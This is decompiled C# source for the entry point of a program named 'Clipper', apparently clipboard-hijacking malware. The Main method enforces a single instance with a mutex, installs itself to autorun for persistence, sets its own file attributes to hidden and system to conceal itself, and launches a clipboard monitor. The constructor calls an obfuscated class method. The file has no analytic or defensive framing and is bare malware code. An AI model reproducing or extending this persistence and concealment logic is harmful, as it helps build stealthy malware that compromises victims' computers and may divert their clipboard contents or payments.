using System;
using Clipper.Modules;

namespace Clipper
{
	// Token: 0x02000004 RID: 4
	internal class Program
	{
		// Token: 0x06000003 RID: 3 RVA: 0x00002249 File Offset: 0x00000449
		[STAThread]
		private static void Main()
		{
			AppMutex.Check();
			if (!Autorun.is_installed())
			{
				Autorun.install();
			}
			Attributes.set_hidden();
			Attributes.set_system();
			ClipboardMonitor.run();
		}

		// Token: 0x06000004 RID: 4 RVA: 0x0000223C File Offset: 0x0000043C
		public Program()
		{
			Class2.ecUkQ4xzjKxn7();
			base..ctor();
		}
	}
}
